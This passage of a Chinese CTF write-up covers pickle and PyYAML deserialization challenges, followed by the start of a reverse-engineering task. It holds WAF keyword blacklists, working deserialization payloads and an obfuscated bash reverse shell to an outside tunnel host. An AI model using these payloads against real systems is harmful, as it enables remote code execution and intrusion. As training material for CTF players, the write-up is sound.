+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="p">{</span><span class="s2">&#34;os&#34;</span><span class="p">,</span> <span class="s2">&#34;system&#34;</span><span class="p">,</span> <span class="s2">&#34;eval&#34;</span><span class="p">,</span> <span class="s1">&#39;setstate&#39;</span><span class="p">,</span> <span class="s2">&#34;globals&#34;</span><span class="p">,</span> <span class="s1">&#39;exec&#39;</span><span class="p">,</span> <span class="s1">&#39;__builtins__&#39;</span><span class="p">,</span> <span class="s1">&#39;template&#39;</span><span class="p">,</span> <span class="s1">&#39;render&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\\</span><span class="s1">&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                 <span class="s1">&#39;compile&#39;</span><span class="p">,</span> <span class="s1">&#39;requests&#39;</span><span class="p">,</span> <span class="s1">&#39;exit&#39;</span><span class="p">,</span>  <span class="s1">&#39;pickle&#39;</span><span class="p">,</span><span class="s2">&#34;class&#34;</span><span class="p">,</span><span class="s2">&#34;mro&#34;</span><span class="p">,</span><span class="s2">&#34;flask&#34;</span><span class="p">,</span><span class="s2">&#34;sys&#34;</span><span class="p">,</span><span class="s2">&#34;base&#34;</span><span class="p">,</span><span class="s2">&#34;init&#34;</span><span class="p">,</span><span class="s2">&#34;config&#34;</span><span class="p">,</span><span class="s2">&#34;session&#34;</span><span class="p">}:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">i</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span> <span class="ow">in</span> <span class="n">pickle_data</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">i</span><span class="o">+</span><span class="s2">&#34; waf !!!!!!!&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">pickle_data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;success pickle&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">except</span> <span class="n">Exception</span> <span class="n">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;fail pickle&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">@</span><span class="n">app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/admin&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">admin</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">username</span> <span class="o">=</span> <span class="n">session</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">username</span> <span class="o">!=</span> <span class="s2">&#34;admin&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&#34;message&#34;</span><span class="p">:</span> <span class="s1">&#39;You are not admin!&#39;</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;Welcome Admin&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">@</span><span class="n">app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/src&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">src</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span>  <span class="n">open</span><span class="p">(</span><span class="s2">&#34;app.py&#34;</span><span class="p">,</span> <span class="s2">&#34;r&#34;</span><span class="p">,</span><span class="n">encoding</span><span class="o">=</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="n">False</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">5000</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>发现一共三个路由， /src、/ppicklee 和 /admin</p>
+<p>进入/admin 路由中提示没有权限，以为是要通过更改SESSID获取管理员权限，来得到flag
+但是这道题三个路由中都没有Cooike，无法成功</p>
+<p>再读源码，发现可以/ppicklee 路由中存在防火墙，所以绕过防火墙，看看能否从 /ppicklee 路由中得到什么
+使用</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import pickle
+</span></span><span class="line"><span class="cl">import base64
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># 使用 subprocess 来绕过
+</span></span><span class="line"><span class="cl">class Exploit:
+</span></span><span class="line"><span class="cl">def __reduce__(self):
+</span></span><span class="line"><span class="cl">    return (getattr, (&#39;subprocess&#39;, &#39;Popen&#39;, (&#39;cat /flag&#39;,)))
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># 创建恶意对象
+</span></span><span class="line"><span class="cl">exploit_obj = Exploit()
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># 将恶意对象序列化为 pickle 数据
+</span></span><span class="line"><span class="cl">pickled_data = pickle.dumps(exploit_obj)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># 编码为 base64
+</span></span><span class="line"><span class="cl">encoded_data = base64.b64encode(pickled_data).decode()
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">print(encoded_data)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>使用POSTman传参，发现只能得到 success pickle
+无法得到flag，遂放弃</p>
+<p>后由WP可知，因为 src 路由会读取 app.py 内容并输出，所以可以尝试先读取flag，再把flag的内容写入到 app.py</p>
+<p>可以使用pker：</p>
+<blockquote>
+<p><a class="link" href="https://github.com/eddieivan01/pker"  target="_blank" rel="noopener"
+    >Pker</a></p></blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">getattr = GLOBAL(&#39;builtins&#39;, &#39;getattr&#39;)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">open = GLOBAL(&#39;builtins&#39;, &#39;open&#39;)
+</span></span><span class="line"><span class="cl">flag=open(&#39;/flag&#39;)
+</span></span><span class="line"><span class="cl">read=getattr(flag, &#39;read&#39;)
+</span></span><span class="line"><span class="cl">f=open(&#39;./app.py&#39;,&#39;w&#39;)
+</span></span><span class="line"><span class="cl">write=getattr(f, &#39;write&#39;)
+</span></span><span class="line"><span class="cl">fff=read()
+</span></span><span class="line"><span class="cl">write(fff)
+</span></span><span class="line"><span class="cl">return  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在 ppicklee 路由中传参，然后在 src 路由中得到flag</p>
+<p>这道题涉及pickle反序列化，在这里粘一个pickle反序列化相关的博客</p>
+<blockquote>
+<p><a class="link" href="https://hachp1.github.io/posts/Web%e5%ae%89%e5%85%a8/20200328-pickle.html"  target="_blank" rel="noopener"
+    >Pickle反序列化初探</a></p></blockquote>
+<h2 id="yaml_matser">yaml_matser
+</h2><p>源码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">plaintext</span>
+</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">os</span>
+</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">re</span>
+</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">yaml</span>
+</span></span><span class="line"><span class="cl"><span class="n">from</span> <span class="n">flask</span> <span class="n">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">jsonify</span><span class="p">,</span> <span class="n">render_template</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">,</span> <span class="n">template_folder</span><span class="o">=</span><span class="s1">&#39;templates&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">UPLOAD_FOLDER</span> <span class="o">=</span> <span class="s1">&#39;uploads&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">makedirs</span><span class="p">(</span><span class="n">UPLOAD_FOLDER</span><span class="p">,</span> <span class="n">exist_ok</span><span class="o">=</span><span class="n">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">waf</span><span class="p">(</span><span class="n">input_str</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">blacklist_terms</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;apply&#39;</span><span class="p">,</span> <span class="s1">&#39;subprocess&#39;</span><span class="p">,</span><span class="s1">&#39;os&#39;</span><span class="p">,</span><span class="s1">&#39;map&#39;</span><span class="p">,</span> <span class="s1">&#39;system&#39;</span><span class="p">,</span> <span class="s1">&#39;popen&#39;</span><span class="p">,</span> <span class="s1">&#39;eval&#39;</span><span class="p">,</span> <span class="s1">&#39;sleep&#39;</span><span class="p">,</span> <span class="s1">&#39;setstate&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                       <span class="s1">&#39;command&#39;</span><span class="p">,</span><span class="s1">&#39;static&#39;</span><span class="p">,</span><span class="s1">&#39;templates&#39;</span><span class="p">,</span><span class="s1">&#39;session&#39;</span><span class="p">,</span><span class="s1">&#39;&amp;&#39;</span><span class="p">,</span><span class="s1">&#39;globals&#39;</span><span class="p">,</span><span class="s1">&#39;builtins&#39;</span>
+</span></span><span class="line"><span class="cl">                       <span class="s1">&#39;run&#39;</span><span class="p">,</span> <span class="s1">&#39;ntimeit&#39;</span><span class="p">,</span> <span class="s1">&#39;bash&#39;</span><span class="p">,</span> <span class="s1">&#39;zsh&#39;</span><span class="p">,</span> <span class="s1">&#39;sh&#39;</span><span class="p">,</span> <span class="s1">&#39;curl&#39;</span><span class="p">,</span> <span class="s1">&#39;nc&#39;</span><span class="p">,</span> <span class="s1">&#39;env&#39;</span><span class="p">,</span> <span class="s1">&#39;before_request&#39;</span><span class="p">,</span> <span class="s1">&#39;after_request&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                       <span class="s1">&#39;error_handler&#39;</span><span class="p">,</span> <span class="s1">&#39;add_url_rule&#39;</span><span class="p">,</span><span class="s1">&#39;teardown_request&#39;</span><span class="p">,</span><span class="s1">&#39;teardown_appcontext&#39;</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\\</span><span class="s1">u&#39;</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\\</span><span class="s1">x&#39;</span><span class="p">,</span><span class="s1">&#39;+&#39;</span><span class="p">,</span><span class="s1">&#39;base64&#39;</span><span class="p">,</span><span class="s1">&#39;join&#39;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">input_str_lower</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">input_str</span><span class="p">)</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">term</span> <span class="ow">in</span> <span class="n">blacklist_terms</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">term</span> <span class="ow">in</span> <span class="n">input_str_lower</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;Found blacklisted term: {term}&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">True</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">False</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">file_pattern</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;.*\.yaml$&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">is_yaml_file</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="ne">bool</span><span class="p">(</span><span class="n">file_pattern</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="n">filename</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">@</span><span class="n">app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">    Welcome to DASCTF X 0psu3
+</span></span></span><span class="line"><span class="cl"><span class="s1">    &lt;br&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">    Here is the challenge &lt;a href=&#34;/upload&#34;&gt;Upload file&lt;/a&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">    &lt;br&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">    Enjoy it &lt;a href=&#34;/Yam1&#34;&gt;Yam1&lt;/a&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">    &#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">@</span><span class="n">app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/upload&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">upload_file</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">uploaded_file</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">files</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">uploaded_file</span> <span class="ow">and</span> <span class="n">is_yaml_file</span><span class="p">(</span><span class="n">uploaded_file</span><span class="o">.</span><span class="n">filename</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">                <span class="n">file_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">UPLOAD_FOLDER</span><span class="p">,</span> <span class="n">uploaded_file</span><span class="o">.</span><span class="n">filename</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="n">uploaded_file</span><span class="o">.</span><span class="n">save</span><span class="p">(</span><span class="n">file_path</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&#34;message&#34;</span><span class="p">:</span> <span class="s2">&#34;uploaded successfully&#34;</span><span class="p">}),</span> <span class="mi">200</span>
+</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&#34;error&#34;</span><span class="p">:</span> <span class="s2">&#34;Just YAML file&#34;</span><span class="p">}),</span> <span class="mi">400</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">except</span> <span class="n">Exception</span> <span class="n">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&#34;error&#34;</span><span class="p">:</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)}),</span> <span class="mi">500</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;upload.html&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">@</span><span class="n">app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/Yam1&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">Yam1</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">filename</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;filename&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">filename</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">with</span> <span class="n">open</span><span class="p">(</span><span class="n">f</span><span class="s1">&#39;uploads/{filename}.yaml&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="n">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">file_content</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">waf</span><span class="p">(</span><span class="n">file_content</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="n">test</span> <span class="o">=</span> <span class="n">yaml</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="n">file_content</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">test</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s1">&#39;welcome&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>进入发现有文件上传功能，而且只能上传 .yaml 文件</p>
+<p>一开始尝试直接输出flag，使用</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">!!python/object:__main__.MyClass
+</span></span><span class="line"><span class="cl">args: !!python/tuple
+</span></span><span class="line"><span class="cl">- !!python/name:globals
+</span></span><span class="line"><span class="cl">- &#34;os.system&#34;
+</span></span><span class="line"><span class="cl">- &#34;echo hello&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>无果</p>
+<p>由WP得知这是一道pyYaml反序列化</p>
+<blockquote>
+<p><a class="link" href="https://xz.aliyun.com/t/12481?time__1311=GqGxRQqiuDyDlrzG78GODc7x9GLPQAox"  target="_blank" rel="noopener"
+    >PyYaml反序列化漏洞详解</a></p></blockquote>
+<p>黑名单中采用了列举法来防止攻击，可以从这里入手，发现没有禁exec</p>
+<p>上传内容：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">!!python/object/new:type
+</span></span><span class="line"><span class="cl">args: [&#39;z&#39;, !!python/tuple [], {&#39;extend&#39;: !!python/name:exec }]
+</span></span><span class="line"><span class="cl">listitems: &#39;__import__(bytes([111,115]).decode()).__getattribute__(bytes([115,121,115,116,101,109]).decode())(bytes([98, 97, 115, 104, 32, 45, 105, 32, 62, 38, 32, 47, 100, 101, 118, 47, 116, 99, 112, 47, 51, 49, 46, 116, 99, 112, 46, 99, 112, 111, 108, 97, 114, 46, 116, 111, 112, 32, 49, 51, 49, 57, 48, 32, 48, 62, 38, 49]
+</span></span><span class="line"><span class="cl">).decode())&#39;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">#__import__(&#39;os&#39;).__getattribute__(&#39;system&#39;)(&#39;bash -i &gt;&amp; /dev/tcp/31.tcp.cpolar.top 13190  0&gt;&amp;1&#39;)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>建立反向shell，得到flag</p>
+<h1 id="reverse">Reverse
+</h1><h2 id="tryre">tryre
+</h2><p>根据提供的代码片段，可以看到这是一个混合了 Base64 编码、异或操作和字符映射的加密验证逻辑。我们需要逆向每一步操作来编写解密脚本，以还原原始的输入字符串。
+以下是解密过程的分步解析和 Python 脚本实现:
+解密步骤解析
+1.Base64 映射表(aZyxabcdefghijk)
+自定义的 Base64 字符映射表:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+/
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>加密时使用了这个映射表对数据进行编码，解密时需要反向查找映射。
+2.加密数据(v21):
+加密的目标字符串为:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">M@ASL3MF~uL3ICT2IhUgKSD2IeDsICH7Hd26HhQgKSOhNCX7TVL3UFMeHi2?
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>3.Base64 编码逻辑
+数据被分为 3字节一组，经过位移和分组操作映射到 Base64 表的索引中。
+解密时需要逆向这些位移和组装操作，还原原始的字节序列。</p>
+<p>4.异或操作:
+在加密过程中，最终的 Base64 编码结果被逐字节与 2进行异或操作。
+解密时需要再次逐字节与 2 进行异或操作，恢复原始数据。</p>
+<p>验证逻辑:解密后的数据与 v21 逐字节对比，如果完全相同，则验证通过</p>
+<p>使用如下脚本进行解码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="c1"># 自定义 Base64 字符映射表</span>
